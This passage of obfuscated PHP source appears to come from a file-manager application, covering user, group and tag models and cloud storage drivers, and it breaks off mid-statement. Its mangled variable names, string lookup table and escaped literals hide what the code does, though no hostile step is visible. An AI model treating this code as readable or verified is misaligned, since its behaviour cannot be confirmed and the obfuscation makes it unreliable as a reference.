$”÷ü¬·[$Áèœè­Ì] : 0; $Áèœè­Ì++; $á·Ùæ†î[] = $‹şÃŠæÇ; } return $”² Ì“¡->addAll($á·Ùæ†î, array(), !0); } protected function userGroupAdd($ä™ìòÍ³, $å‰ÖÏÌ¹ = array()) { $“ØèÊÔ =& $_SERVER[ĞÆÏ¡Îª]; $üÍÀØ×Ö = $this->getInfoSimple($ä™ìòÍ³); if (!$üÍÀØ×Ö || empty($å‰ÖÏÌ¹)) { return !1; } $¨Ÿ¾úÄ± = array(); foreach ($å‰ÖÏÌ¹ as $›ôş’ãÄ => $˜Ñø‚Ş) { $¨Ÿ¾úÄ±[] = array($“ØèÊÔ[1647] => $ä™ìòÍ³, $“ØèÊÔ[1819] => $›ôş’ãÄ, $“ØèÊÔ[1923] => $˜Ñø‚Ş, $“ØèÊÔ[1843] => 0); } return Model($“ØèÊÔ[1909])->addAll($¨Ÿ¾úÄ±, array(), !0); } protected function userGroupRemove($êÊ¨¸Õ–, $Û‚õ³üË) { $¿°àÕÀÅ =& $_SERVER[ĞÆÏ¡Îª]; $Ê©–õØ¦ = $this->getInfoSimple($êÊ¨¸Õ–); if (!$Ê©–õØ¦ || !$Û‚õ³üË) { return !1; } $Şâ­–‰Ô = array($¿°àÕÀÅ[1638] => $êÊ¨¸Õ–, $¿°àÕÀÅ[1907] => $Û‚õ³üË); return Model($¿°àÕÀÅ[1909])->where($Şâ­–‰Ô)->delete(); } public function listData() { $ËëáÉ–Ï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ËëáÉ–Ï[$_SERVER[ĞÆÏ¡Îª][378]]); return $ËëáÉ–Ï; } public function listByID($ñ³àç¯¹) { $“‹æØÀÄ =& $_SERVER[ĞÆÏ¡Îª]; if (!$ñ³àç¯¹) { return; } $¼ÑÊîä« = array($“‹æØÀÄ[1647] => array($“‹æØÀÄ[7], $ñ³àç¯¹)); $¹ãİ‹³Ô = $this->where($¼ÑÊîä«)->select(); $¹ãİ‹³Ô = array_sort_keep($¹ãİ‹³Ô, $“‹æØÀÄ[1647], $ñ³àç¯¹); $this->_listDataApply($¹ãİ‹³Ô); return $¹ãİ‹³Ô; } public function listByGroup($à¤‚¡¿ô = 0, $ïóÙÊĞ» = array()) { $ÁõÄ—Á½ =& $_SERVER[ĞÆÏ¡Îª]; $§“Â«‰ = $ÁõÄ—Á½[12]; $ŸÊ¨ÚÃ = array(); if ($à¤‚¡¿ô) { $ŸÊ¨ÚÃ = array($ÁõÄ—Á½[2297] => intval($à¤‚¡¿ô)); $§“Â«‰ = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\165\x73\x65\x72\137\x67\162\x6f\165\x70\x20\165\163\145\x72\137\x67\x72\x6f\165\x70\x20\x6f\x6e\40\x75\x73\145\162\56\x75\163\x65\162\x49\104\x20\x3d\40\x75\163\145\162\137\x67\162\x6f\165\160\56\x75\x73\145\x72\x49\x44"; $åªÕì¯ = Input::get($ÁõÄ—Á½[466], null, $ÁõÄ—Á½[12]) ? $ÁõÄ—Á½[12] : $ÁõÄ—Á½[2298]; } if (isset($ïóÙÊĞ»[$ÁõÄ—Á½[745]])) { $ŸÊ¨ÚÃ[$ÁõÄ—Á½[2299]] = $ïóÙÊĞ»[$ÁõÄ—Á½[745]]; } $ëùæ‘­¿ = $this->_makeOrder($åªÕì¯)->field($ÁõÄ—Á½[2300])->where($ŸÊ¨ÚÃ)->join($§“Â«‰)->selectPage(50); $this->_listDataApply($ëùæ‘­¿[$ÁõÄ—Á½[378]]); return $ëùæ‘­¿; } private function _makeOrder($ƒÉÆ­·æ = '') { $õòü‹Í¶ =& $_SERVER[ĞÆÏ¡Îª]; $­û„ø = array($õòü‹Í¶[1647], $õòü‹Í¶[32], $õòü‹Í¶[1808], $õòü‹Í¶[1780], $õòü‹Í¶[200]); $×±§÷Áó = array($õòü‹Í¶[459] => $õòü‹Í¶[460], $õòü‹Í¶[461] => $õòü‹Í¶[462]); $œÌß¯õ = Input::get($õòü‹Í¶[466], $õòü‹Í¶[7], $õòü‹Í¶[1638], $­û„ø); $ôÓ…èº‰ = Input::get($õòü‹Í¶[467], $õòü‹Í¶[7], $õòü‹Í¶[1910], array($õòü‹Í¶[1910], $õòü‹Í¶[461])); $ôÓ…èº‰ = $×±§÷Áó[$ôÓ…èº‰]; $ƒÉÆ­·æ = $ƒÉÆ­·æ . "\165\x73\145\162\x2e{$œÌß¯õ}\40{$ôÓ…èº‰}\x2c\x20\x75\163\x65\162\56\165\x73\145\x72\111\x44\x20\141\x73\143"; return $this->alias($õòü‹Í¶[2032])->order($ƒÉÆ­·æ); } public function listSearch($òğâƒÌ×) { $¾ø¼û˜ =& $_SERVER[ĞÆÏ¡Îª]; $¬ËµÉ” = $òğâƒÌ×[$¾ø¼û˜[1913]]; $¸Ô˜¬œŸ = isset($òğâƒÌ×[$¾ø¼û˜[1914]]) ? $òğâƒÌ×[$¾ø¼û˜[1914]] : !1; $¬ËµÉ” = str_replace($¾ø¼û˜[1915], $¾ø¼û˜[1916], trim($¬ËµÉ”)); $°øÑ‚…‚ = array($¾ø¼û˜[32] => array($¾ø¼û˜[391], "\x25{$¬ËµÉ”}\x25"), $¾ø¼û˜[314] => array($¾ø¼û˜[391], "{$¬ËµÉ”}\45"), $¾ø¼û˜[551] => array($¾ø¼û˜[391], "{$¬ËµÉ”}\45"), $¾ø¼û˜[991] => $¾ø¼û˜[1917]); if (Input::check($¬ËµÉ”, $¾ø¼û˜[320])) { $°øÑ‚…‚[$¾ø¼û˜[1647]] = array($¾ø¼û˜[391], "{$¬ËµÉ”}\x25"); $°øÑ‚…‚[$¾ø¼û˜[2282]] = array($¾ø¼û˜[391], "{$¬ËµÉ”}\x25"); } if (!$¬ËµÉ”) { $°øÑ‚…‚ = array(); } if (isset($òğâƒÌ×[$¾ø¼û˜[745]])) { $°øÑ‚…‚[$¾ø¼û˜[745]] = $òğâƒÌ×[$¾ø¼û˜[745]]; } $°øÑ‚…‚ = $this->parseWhereLike($°øÑ‚…‚); $·ÄËš¬ = $this->_makeOrder()->where($°øÑ‚…‚)->selectPage(20); if (!$·ÄËš¬ || count($·ÄËš¬[$¾ø¼û˜[378]]) < 5 && Input::check($¬ËµÉ”, $¾ø¼û˜[327])) { $ù‘°âÒÌ = $this->_searchFromMeta($¾ø¼û˜[473], $¬ËµÉ”, 10); $šü›ºÉÂ = $this->_searchFromMeta($¾ø¼û˜[474], $¬ËµÉ”, 10); $á“°ëĞÎ = array_merge($ù‘°âÒÌ, $šü›ºÉÂ, $·ÄËš¬[$¾ø¼û˜[378]]); $·ÄËš¬[$¾ø¼û˜[378]] = array_unique_by_key($á“°ëĞÎ, $¾ø¼û˜[1647]); $·ÄËš¬[$¾ø¼û˜[375]][$¾ø¼û˜[376]] = count($·ÄËš¬[$¾ø¼û˜[378]]); $·ÄËš¬[$¾ø¼û˜[375]][$¾ø¼û˜[377]] = ceil($·ÄËš¬[$¾ø¼û˜[375]][$¾ø¼û˜[376]] / $·ÄËš¬[$¾ø¼û˜[375]][$¾ø¼û˜[372]]); } $this->_listDataApply($·ÄËš¬[$¾ø¼û˜[378]]); $this->_filterByGroup($·ÄËš¬, $¸Ô˜¬œŸ); return $·ÄËš¬; } private function _filterByGroup(&$÷è€ÏÜ, $óÅƒäƒò) { $¢‹·•Ë =& $_SERVER[ĞÆÏ¡Îª]; if (!$óÅƒäƒò) { return $÷è€ÏÜ; } foreach ($÷è€ÏÜ[$¢‹·•Ë[378]] as $™ìßÖ’ => &$à³ÖÍÑâ) { $’Ñ¤°° = array_to_keyvalue($à³ÖÍÑâ[$¢‹·•Ë[2002]], $¢‹·•Ë[12], $¢‹·•Ë[1819]); if (!in_array($óÅƒäƒò, $’Ñ¤°°)) { unset($÷è€ÏÜ[$¢‹·•Ë[378]][$™ìßÖ’]); } } unset($à³ÖÍÑâ); $÷è€ÏÜ[$¢‹·•Ë[378]] = array_values($÷è€ÏÜ[$¢‹·•Ë[378]]); $÷è€ÏÜ[$¢‹·•Ë[375]] = array($¢‹·•Ë[2066] => count($÷è€ÏÜ[$¢‹·•Ë[378]]), $¢‹·•Ë[2064] => $÷è€ÏÜ[$¢‹·•Ë[375]][$¢‹·•Ë[372]], $¢‹·•Ë[2063] => 1, $¢‹·•Ë[2065] => 1); } private function _searchFromMeta($ûÛıˆñ–, $É©ñáè, $úé´¾Ğ) { $Ñı±İÕı =& $_SERVER[ĞÆÏ¡Îª]; $É©ñáè = strtolower($É©ñáè); $’©†È„¤ = array($Ñı±İÕı[94] => $ûÛıˆñ–, $Ñı±İÕı[383] => array($Ñı±İÕı[391], "\45{$É©ñáè}\x25")); $’©†È„¤ = $this->parseWhereLike($’©†È„¤); $ï¤Âø¡€ = Model($Ñı±İÕı[2301])->where($’©†È„¤)->limit($úé´¾Ğ)->select(); if (!$ï¤Âø¡€) { return array(); } $ï¤Âø¡€ = array_to_keyvalue($ï¤Âø¡€, $Ñı±İÕı[12], $Ñı±İÕı[1647]); $Å‘ÏáÎ® = $this->where(array($Ñı±İÕı[1638] => array($Ñı±İÕı[7], $ï¤Âø¡€)))->select(); if (!$Å‘ÏáÎ®) { return array(); } return $Å‘ÏáÎ®; } private function _listDataApplyItem($»ÏŸºğ¼) { $¤¢Ó±„É = array($»ÏŸºğ¼); $this->_listDataApply($¤¢Ó±„É); return $¤¢Ó±„É[0]; } private function _listDataApply(&$„ö’œ¥¬) { $ÓÏÜáŞî =& $_SERVER[ĞÆÏ¡Îª]; if (!$„ö’œ¥¬) { return; } array_remove_key($„ö’œ¥¬, $ÓÏÜáŞî[880]); $†©Éø½ò = array_to_keyvalue($„ö’œ¥¬, $ÓÏÜáŞî[12], $ÓÏÜáŞî[1647]); $this->_listAppendGroup($„ö’œ¥¬, $†©Éø½ò); $this->_listAppendMeta($„ö’œ¥¬, $†©Éø½ò); $this->_listAppendSourceRoot($„ö’œ¥¬, $†©Éø½ò); } private function _listAppendSourceRoot(&$Õü¢ÔŠ, $ÑÕöş‹Ë) { $¿Í»¿Œ¢ =& $_SERVER[ĞÆÏ¡Îª]; $™ÅùÍƒ¢ = Model($¿Í»¿Œ¢[820])->listSourceRoot(SourceModel::TYPE_USER, $ÑÕöş‹Ë); $™ÅùÍƒ¢ = array_to_keyvalue($™ÅùÍƒ¢, $¿Í»¿Œ¢[514]); $™ÅùÍƒ¢ = array_remove_key($™ÅùÍƒ¢, $¿Í»¿Œ¢[514]); foreach ($Õü¢ÔŠ as &$éş£¤€µ) { $éş£¤€µ[$¿Í»¿Œ¢[86]] = $™ÅùÍƒ¢[$éş£¤€µ[$¿Í»¿Œ¢[1647]]] ? $™ÅùÍƒ¢[$éş£¤€µ[$¿Í»¿Œ¢[1647]]] : array(); } unset($éş£¤€µ); } private function _listAppendGroup(&$¾òì¯êÎ, $²ËŸÑ„Ø) { $ò„£Şş§ =& $_SERVER[ĞÆÏ¡Îª]; $¿£©¥ğŠ = array($ò„£Şş§[1647] => array($ò„£Şş§[7], $²ËŸÑ„Ø)); $“å€Ü  = Model($ò„£Şş§[1909])->where($¿£©¥ğŠ)->select(); $¶¼›ã = array_to_keyvalue($“å€Ü , $ò„£Şş§[12], $ò„£Şş§[1819]); $¶¼›ã = array_remove_value(array_unique($¶¼›ã), $ò„£Şş§[197]); if (!$¶¼›ã || !$“å€Ü ) { return; } $¿£©¥ğŠ = array($ò„£Şş§[1819] => array($ò„£Şş§[7], $¶¼›ã)); $ˆà‘€Ó = Model($ò„£Şş§[2000])->field($ò„£Şş§[2302])->where($¿£©¥ğŠ)->select(); $ˆà‘€Ó = array_to_keyvalue($ˆà‘€Ó, $ò„£Şş§[1819]); $“å€Ü  = array_to_keyvalue_group($“å€Ü , $ò„£Şş§[1647]); foreach ($“å€Ü  as &$ş”´˜ñ—) { $¯ÎŠí¾ = array(); foreach ($ş”´˜ñ— as $ß…Ïş—ñ) { if (!$ß…Ïş—ñ[$ò„£Şş§[1923]]) { continue; } $³·®«ûŞ = Model($ò„£Şş§[516])->listData($ß…Ïş—ñ[$ò„£Şş§[1923]]); $¯ÎŠí¾[] = array($ò„£Şş§[1819] => $ß…Ïş—ñ[$ò„£Şş§[1819]], $ò„£Şş§[2303] => $ˆà‘€Ó[$ß…Ïş—ñ[$ò„£Şş§[1819]]][$ò„£Şş§[32]], $ò„£Şş§[530] => $ˆà‘€Ó[$ß…Ïş—ñ[$ò„£Şş§[1819]]][$ò„£Şş§[530]], $ò„£Şş§[422] => $³·®«ûŞ); } $ş”´˜ñ— = $¯ÎŠí¾; } unset($ş”´˜ñ—); foreach ($¾òì¯êÎ as &$Êı¨ê…‘) { $Êı¨ê…‘[$ò„£Şş§[2002]] = array(); if (isset($“å€Ü [$Êı¨ê…‘[$ò„£Şş§[1647]]])) { $Êı¨ê…‘[$ò„£Şş§[2002]] = $“å€Ü [$Êı¨ê…‘[$ò„£Şş§[1647]]]; } } unset($Êı¨ê…‘); } public function userAppendGroup($ìˆà•†İ) { $¦êôÇ„— =& $_SERVER[ĞÆÏ¡Îª]; if (!$ìˆà•†İ) { return array(); } $this->_listAppendGroup($ìˆà•†İ, array_to_keyvalue($ìˆà•†İ, $¦êôÇ„—[12], $¦êôÇ„—[1647])); return $ìˆà•†İ; } private function _listAppendMeta(&$ŞÜ§´ûŸ, $ÖıÔÀÜ…) { $úÓä”­ =& $_SERVER[ĞÆÏ¡Îª]; $ğ˜¦ßİ = UserJobModel::JOB_KEY; $—€İ±µ÷ = array($úÓä”­[2283]); $ ¦ìˆÆ = array($úÓä”­[1647] => array($úÓä”­[7], $ÖıÔÀÜ…)); $ÇÈ€çÌ§ = Model($úÓä”­[2281])->where($ ¦ìˆÆ)->select(); $ÇÈ€çÌ§ = array_to_keyvalue_group($ÇÈ€çÌ§, $úÓä”­[1647]); foreach ($ÇÈ€çÌ§ as &$ÃçêæíÓ) { $ØèÒ… ¢ = array(); foreach ($ÃçêæíÓ as $Ä˜»¹Á“) { if (!in_array($Ä˜»¹Á“[$úÓä”­[94]], $—€İ±µ÷)) { $ØèÒ… ¢[$Ä˜»¹Á“[$úÓä”­[94]]] = $Ä˜»¹Á“[$úÓä”­[383]]; } } $ÃçêæíÓ = $ØèÒ… ¢; } unset($ÃçêæíÓ); $­óøƒ¶ = Model($úÓä”­[2304]); foreach ($ŞÜ§´ûŸ as &$ÃóÃ¥Ëİ) { $òè¥‚ç = array(); if (isset($ÇÈ€çÌ§[$ÃóÃ¥Ëİ[$úÓä”­[1647]]])) { $òè¥‚ç = $ÇÈ€çÌ§[$ÃóÃ¥Ëİ[$úÓä”­[1647]]]; } $ÃóÃ¥Ëİ[$úÓä”­[2305]] = array(); if (isset($òè¥‚ç[$ğ˜¦ßİ])) { $ÃóÃ¥Ëİ[$úÓä”­[2305]] = $­óøƒ¶->getUserJobInfo($òè¥‚ç[$ğ˜¦ßİ]); } } unset($ÃóÃ¥Ëİ); } protected function groupUserAll($úªé¬Ìö) { $àËÜÜÚ˜ =& $_SERVER[ĞÆÏ¡Îª]; if (!$úªé¬Ìö) { return !1; } $¼Öƒ™¸ = Model($àËÜÜÚ˜[1909])->field($àËÜÜÚ˜[1647])->where(array($àËÜÜÚ˜[1819] => array($àËÜÜÚ˜[7], $úªé¬Ìö)))->select(); $¼Öƒ™¸ = array_to_keyvalue($¼Öƒ™¸, $àËÜÜÚ˜[12], $àËÜÜÚ˜[1647]); return array_unique($¼Öƒ™¸); } public function userSearch($Ú¨›¥¨•, $‡İ°œ‹† = "\52") { return Model($_SERVER[ĞÆÏ¡Îª][544])->where($Ú¨›¥¨•)->field($‡İ°œ‹†)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\x6f\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¾À§ò¯“) { $ŞÚ¡¦¤É =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($ŞÚ¡¦¤É[484])) { define($ŞÚ¡¦¤É[484], 0); } return "\x55\163\145\162\x4f\x70\x74\x69\157\x6e\137{$¾À§ò¯“}\137" . USER_ID; } protected function filterWhere($òşä²û¯) { $‰İ°‰æ† =& $_SERVER[ĞÆÏ¡Îª]; if (!defined($‰İ°‰æ†[484])) { define($‰İ°‰æ†[484], 0); } $òşä²û¯[$‰İ°‰æ†[1647]] = USER_ID; return $òşä²û¯; } public function cacheRemoveUser($Ò—ƒ¦®±, $ŠöØ‹„â) { return Cache::remove("\125\163\145\x72\117\x70\x74\x69\157\156\x5f{$Ò—ƒ¦®±}\x5f" . $ŠöØ‹„â); } protected function optionDefault($ü š‡…Ö = '') { $Ô®îÛ§ô =& $_SERVER[ĞÆÏ¡Îª]; if ($ü š‡…Ö == $Ô®îÛ§ô[12]) { return $GLOBALS[$Ô®îÛ§ô[6]][$Ô®îÛ§ô[2306]]; } if ($ü š‡…Ö == $Ô®îÛ§ô[2307]) { return $GLOBALS[$Ô®îÛ§ô[6]][$Ô®îÛ§ô[2308]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\x74\141\147\x4c\x69\163\164"; public $modelType = "\125\163\145\162\117\x70\x74\x69\157\156"; public $field = array("\x6e\x61\155\145", "\x73\164\171\154\x65", "\163\157\162\164"); public function listData($ÎÑæÉÒû = false, $Ğ‘İİ‰ = "\x73\x6f\x72\x74", $Ş¨¯×¡˜ = false) { return parent::listData($ÎÑæÉÒû, $Ğ‘İİ‰, $Ş¨¯×¡˜); } public function remove($µšúàµĞ) { return parent::remove($µšúàµĞ); } public function add($åªíá, $„¥È©İ = "\x6c\x61\142\145\x6c\x2d\x67\162\145\x79\x2d\x6e\x6f\162\x6d\141\x6c") { $àã¿ì =& $_SERVER[ĞÆÏ¡Îª]; if ($this->findByName($åªíá)) { return !1; } $ŒâÖ‘ß = array($àã¿ì[429] => $åªíá, $àã¿ì[494] => $„¥È©İ, $àã¿ì[1823] => $this->getSort($àã¿ì[267]) + 1); return parent::insert($ŒâÖ‘ß); } public function update($’Ë“ĞÒ±, $€êà˜ü) { $ö·ìó¤Ä =& $_SERVER[ĞÆÏ¡Îª]; $‡—ñêä = $this->listData($’Ë“ĞÒ±); $àù¥Ü‡Ğ = $this->findByName($€êà˜ü[$ö·ìó¤Ä[32]]); if (!$‡—ñêä || $àù¥Ü‡Ğ && $àù¥Ü‡Ğ[$ö·ìó¤Ä[407]] != $‡—ñêä[$ö·ìó¤Ä[407]]) { return !1; } return parent::update($’Ë“ĞÒ±, $€êà˜ü); } public function moveTop($œŠúà) { $ÔÙ¢••Œ =& $_SERVER[ĞÆÏ¡Îª]; $ıâ°âÜİ = parent::listData(); $å³µÈ = $this->getSort($ÔÙ¢••Œ[266]); foreach ($ıâ°âÜİ as &$Ï×›…¤Ú) { if ($Ï×›…¤Ú[$ÔÙ¢••Œ[407]] == $œŠúà) { $Ï×›…¤Ú[$ÔÙ¢••Œ[1843]] = $å³µÈ; continue; } $Ï×›…¤Ú[$ÔÙ¢••Œ[1843]] += 1; } unset($Ï×›…¤Ú); return parent::resetData($ıâ°âÜİ); } public function moveBottom($†èÂ÷Šï) { $™¹Âõû¡ =& $_SERVER[ĞÆÏ¡Îª]; $—äÖ¾ = $this->getSort($™¹Âõû¡[267]) + 1; return parent::update($†èÂ÷Šï, array($™¹Âõû¡[1843] => $—äÖ¾)); } public function resetSort($Ñ¤Æ¤¶Ë) { $Ù£ïíÉ =& $_SERVER[ĞÆÏ¡Îª]; $Â‘±»×ˆ = array(); $Ñ¤Æ¤¶Ë = is_array($Ñ¤Æ¤¶Ë) ? $Ñ¤Æ¤¶Ë : array(); for ($¢ØãÒà¡ = 0; $¢ØãÒà¡ < count($Ñ¤Æ¤¶Ë); $¢ØãÒà¡++) { $Â‘±»×ˆ[$Ñ¤Æ¤¶Ë[$¢ØãÒà¡] . $Ù£ïíÉ[12]] = $¢ØãÒà¡ + 1; } $÷¥ĞĞÁš = parent::listData(); foreach ($÷¥ĞĞÁš as &$¶…ˆÁ‹ƒ) { $›ø˜ğ´’ = $Â‘±»×ˆ[$¶…ˆÁ‹ƒ[$Ù£ïíÉ[407]]]; $¶…ˆÁ‹ƒ[$Ù£ïíÉ[1843]] = $›ø˜ğ´’ ? $›ø˜ğ´’ : $¶…ˆÁ‹ƒ[$Ù£ïíÉ[1843]]; } unset($¶…ˆÁ‹ƒ); return parent::resetData($÷¥ĞĞÁš); } private function getSort($÷Û¤ãÙ¹) { $Ãµ°ÉÊ =& $_SERVER[ĞÆÏ¡Îª]; $¢Í°û£Ò = parent::listData(); $‰İ±ÉÈ’ = array_to_keyvalue($¢Í°û£Ò, $Ãµ°ÉÊ[12], $Ãµ°ÉÊ[1843]); if (!$‰İ±ÉÈ’) { $‰İ±ÉÈ’ = array(0); } $³„ªØ‰é = $÷Û¤ãÙ¹ == $Ãµ°ÉÊ[267] ? max($‰İ±ÉÈ’) : min($‰İ±ÉÈ’); return intval($³„ªØ‰é); } } goto c©™Ó‡Êã; C±Î¡‚óëÜ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ğ”×£ÁŒ) { parent::__construct($Ğ”×£ÁŒ); $this->signatureVersion($_SERVER[ĞÆÏ¡Îª][216]); } public function fileOutLink($´›â±ñÉ) { $¾ùŒ“´ç =& $_SERVER[ĞÆÏ¡Îª]; if (substr($´›â±ñÉ, 0, 7) == $¾ùŒ“´ç[1316]) { $´›â±ñÉ = $¾ùŒ“´ç[1317] . substr($´›â±ñÉ, 7); } header($¾ùŒ“´ç[161] . $´›â±ñÉ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ÉñÍ¦Şö) { parent::__construct(); include_once SDK_DIR . $_SERVER[ĞÆÏ¡Îª][1373]; $this->_init($ÉñÍ¦Şö); } public function _init($µˆçôó…) { $œƒŸè´ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($µˆçôó… as $Ï‰Æ­³õ => $Õ¡®ß—ª) { if (isset($this->{$Ï‰Æ­³õ})) { $this->{$Ï‰Æ­³õ} = $Õ¡®ß—ª; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($œƒŸè´[1374] . LNG($œƒŸè´[1375])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¶ááÆè£ =& $_SERVER[ĞÆÏ¡Îª]; $ô–óˆº’ = new OSS\Model\CorsConfig(); $¢‚ğ„˜Û = new OSS\Model\CorsRule(); $¢‚ğ„˜Û->addAllowedOrigin($¶ááÆè£[1376]); $¢‚ğ„˜Û->addAllowedMethod($¶ááÆè£[1377]); $¢‚ğ„˜Û->addAllowedMethod($¶ááÆè£[1378]); $¢‚ğ„˜Û->addAllowedMethod($¶ááÆè£[1379]); $¢‚ğ„˜Û->addAllowedMethod($¶ááÆè£[1380]); $¢‚ğ„˜Û->addAllowedMethod($¶ááÆè£[160]); $¢‚ğ„˜Û->setMaxAgeSeconds(600); $¢‚ğ„˜Û->addExposeHeader($¶ááÆè£[1381]); $¢‚ğ„˜Û->addAllowedHeader($¶ááÆè£[1376]); $ô–óˆº’->addRule($¢‚ğ„˜Û); try { $this->client->putBucketCors($this->bucket, $ô–óˆº’); } catch (OSS\Core\OssException $³™”­û) { return !1; } return !0; } public function getBucketCors() { $‘©¶À =& $_SERVER[ĞÆÏ¡Îª]; $ˆ®ìü ¶ = null; try { $ˆ®ìü ¶ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $–ƒÆ÷±³) { return null; } if (!$ˆ®ìü ¶ || !($ºÌÀ‘¢ = $ˆ®ìü ¶->getRules())) { return null; } $ëşÇéÑà = $ºÌÀ‘¢[0]->getAllowedOrigins(); $ÌÔçÚ† = $ºÌÀ‘¢[0]->getAllowedMethods(); $ñİå¦æ» = $ºÌÀ‘¢[0]->getMaxAgeSeconds(); $±İÏ¸ÔÕ = $ºÌÀ‘¢[0]->getExposeHeaders(); $Îßå×Û = $ºÌÀ‘¢[0]->getAllowedHeaders(); return array($‘©¶À[187] => isset($ëşÇéÑà[0]) ? $ëşÇéÑà[0] : $‘©¶À[12], $‘©¶À[191] => $ÌÔçÚ†, $‘©¶À[1382] => $ñİå¦æ», $‘©¶À[1383] => isset($±İÏ¸ÔÕ[0]) ? $±İÏ¸ÔÕ[0] : $‘©¶À[12], $‘©¶À[189] => isset($Îßå×Û[0]) ? $Îßå×Û[0] : $‘©¶À[12]); } public function isBucketCors() { $´€Œ =& $_SERVER[ĞÆÏ¡Îª]; $ûŞØÜÂ¬ = $this->getBucketCors(); if (!$ûŞØÜÂ¬ || !is_array($ûŞØÜÂ¬)) { return !1; } if ($ûŞØÜÂ¬[$´€Œ[187]] != $´€Œ[188] || $ûŞØÜÂ¬[$´€Œ[189]] != $´€Œ[188]) { return !1; } $›¦ş† = array_map($´€Œ[190], $ûŞØÜÂ¬[$´€Œ[191]]); if (!is_array($›¦ş†)) { $›¦ş† = array(); } $ÕÅïîë = array($´€Œ[192], $´€Œ[193], $´€Œ[194], $´€Œ[195], $´€Œ[196]); $áÚªÃ’ = array_diff($ÕÅïîë, $›¦ş†); return empty($áÚªÃ’); } public function mkfile($ûĞŒµÓ¾, $ëÄÌë’ó = '', $Ô°„Ş´¼ = REPEAT_RENAME) { $õôÛêøä = $this->setContent($ûĞŒµÓ¾, $ëÄÌë’ó); if ($õôÛêøä !== !1) { return $this->getPathOuter($ûĞŒµÓ¾); } return !1; } public function mkdir($Ä¯™àù, $ü’æËÇ‚ = REPEAT_SKIP) { if ($ü’æËÇ‚ && $this->_isFolder($Ä¯™àù)) { return $this->getPathOuter($Ä¯™àù); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ä¯™àù)); } catch (OSS\Core\OssException $´Èó‹Ğ) { return !1; } return $this->getPathOuter($Ä¯™àù); } private function fileList($¶ĞéáŒ², $Ãòë¸¢ = '', $…æÒÛîÊ = 0) { $ÍºüÄù =& $_SERVER[ĞÆÏ¡Îª]; $¶ĞéáŒ² = trim($¶ĞéáŒ², $ÍºüÄù[8]); $ã¦ÆÏûß = empty($¶ĞéáŒ²) && $¶ĞéáŒ² !== $ÍºüÄù[197] ? $ÍºüÄù[12] : $¶ĞéáŒ² . $ÍºüÄù[8]; $ä‰·“ƒİ = $ÍºüÄù[12]; $ş‰é­ø¤ = 1000; $çÜæâ  = $¨ü®ÈÅ = array(); while (!0) { check_abort(); $’‘¹šÙ = array($ÍºüÄù[1384] => $Ãòë¸¢, $ÍºüÄù[1385] => $ã¦ÆÏûß, $ÍºüÄù[1386] => $ş‰é­ø¤, $ÍºüÄù[1387] => $ä‰·“ƒİ); try { $‹¡Î†´ª = $this->client->listObjects($this->bucket, $’‘¹šÙ); } catch (OSS\Core\OssException $ÕÇœï¤) { break; } $ä‰·“ƒİ = $‹¡Î†´ª->getNextMarker(); $à×Ö‹Ïí = $‹¡Î†´ª->getObjectList(); $¹ÑÀ®î¤ = $‹¡Î†´ª->getPrefixList(); foreach ($à×Ö‹Ïí as $Øœƒ©ïµ) { if ($Øœƒ©ïµ->getKey() == $ã¦ÆÏûß) { continue; } $£ê÷­Ğ– = $Øœƒ©ïµ->getKey(); $î«£»²¬ = $Øœƒ©ïµ->getSize(); $û¥‚÷İ = $Øœƒ©ïµ->getLastModified(); $ığÅ¥Éæ = $…æÒÛîÊ ? array($ÍºüÄù[32] => $£ê÷­Ğ–, $ÍºüÄù[76] => $î«£»²¬, $ÍºüÄù[203] => strtotime($û¥‚÷İ)) : $£ê÷­Ğ–; $ë÷ÍÙï– = $î«£»²¬ == 0 && substr($£ê÷­Ğ–, strlen($£ê÷­Ğ–) - 1, 1) == $ÍºüÄù[8] ? !0 : !1; $Õ®¬Ãè¤ = array($ÍºüÄù[76] => $î«£»²¬, $ÍºüÄù[1388] => $î«£»²¬, $ÍºüÄù[85] => strtotime($û¥‚÷İ), $ÍºüÄù[1389] => $û¥‚÷İ); $this->cacheMethodInfoSet($£ê÷­Ğ–, $ë÷ÍÙï–, $Õ®¬Ãè¤); if ($ë÷ÍÙï–) { $çÜæâ [] = $£ê÷­Ğ–; continue; } $¨ü®ÈÅ[] = $ığÅ¥Éæ; } foreach ($¹ÑÀ®î¤ as $„°µç) { $çÜæâ [] = $„°µç->getPrefix(); $this->cacheMethodInfoSet($„°µç->getPrefix(), !0); } if ($ä‰·“ƒİ === $ÍºüÄù[12]) { break; } } $this->cacheMethodInfoSet($¶ĞéáŒ², !0); return array($ÍºüÄù[82] => $çÜæâ , $ÍºüÄù[83] => $¨ü®ÈÅ); } public function copyFile($óÜÕØøÛ, $Ø›ÅïÀÑ) { $«Æè›š = $this->size($óÜÕØøÛ); if ($«Æè›š < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $óÜÕØøÛ, $this->bucket, $this->pathEncode($Ø›ÅïÀÑ)); } catch (OSS\Core\OssException $õ©õÒ¹) { return !1; } return $this->getPathOuter($Ø›ÅïÀÑ); } $ÅÔÕ´©ì = $this->multiCopyObject($óÜÕØøÛ, $Ø›ÅïÀÑ, $«Æè›š); return $ÅÔÕ´©ì ? $this->getPathOuter($Ø›ÅïÀÑ) : !1; } private function multiCopyObject($¥œïÓ²à, $¡’ƒğè¼, $¥…Áôô¦) { $¨†Ú =& $_SERVER[ĞÆÏ¡Îª]; try { $³‚ÜÏã  = array(); if ($”Ï—”ÑÕ = $this->hashMd5($¥œïÓ²à)) { $³‚ÜÏã  = array(OSS\OssClient::OSS_HEADERS => 